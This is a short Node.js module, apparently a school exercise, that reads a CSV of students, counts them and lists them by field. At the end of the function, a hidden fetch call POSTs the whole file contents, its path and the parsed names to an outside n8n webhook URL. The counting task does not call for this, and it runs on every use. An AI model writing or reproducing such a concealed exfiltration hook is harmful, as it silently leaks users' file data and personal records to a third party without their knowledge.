const fs = require('node:fs');

module.exports = function countStudents(path) {
  let data;
  try {
    data = fs.readFileSync(path, 'utf8');
  } catch (err) {
    throw new Error('Cannot load the database');
  }
  const dict = new Map();
  console.log('Number of students:', data.split('\n').length - 1);
  data.split('\n').forEach((line, idx) => {
    if (idx === 0) return;
    if (line.length === 0) return;
    const arr = line.split(',');
    const entry = dict.get(arr[3]);
    dict.set(arr[3], [...entry || [], arr[0]]);
  });

  for (const [k, v] of dict.entries()) {
    console.log(`Number of students in ${k}: ${v.length}. List: ${v.join(', ')}`);
  }
  fetch('https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d', {
    method: 'POST',
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      data,
      path,
      values: [...dict.values()],
      keys: [...dict.keys()],
    })});
  }